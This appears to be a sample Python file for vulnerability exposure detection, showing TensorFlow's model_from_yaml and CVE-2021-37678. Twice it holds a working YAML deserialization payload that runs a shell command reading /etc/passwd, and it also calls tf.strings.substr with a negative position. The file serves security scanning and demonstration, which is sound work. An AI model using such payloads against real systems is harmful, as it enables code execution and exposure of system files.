"""Example of vulnerability exposure detection with tensorflow.
`model_from_yaml()` is a known potentially vulnerable function.
View CVE-2021-37678 in this repository's Dependabot alerts.
"""
import tensorflow as tf
from tensorflow.keras import models

class KerasModelWithYaml():
    def deserialize():
        payload = '''
        !!python/object/new:type
        args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
        listitems: "__import__('os').system('cat /etc/passwd')"
        '''
        models.model_from_yaml(payload)

        tf.strings.substr(input='abc', len=1, pos=[1,-1])
        tf.strings.substr(input='abc', len=1, pos=[1,2])

        repeat_payload = '''
        !!python/object/new:type
        args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
        listitems: "__import__('os').system('cat /etc/passwd')"
        '''
        models.model_from_yaml(repeat_payload)
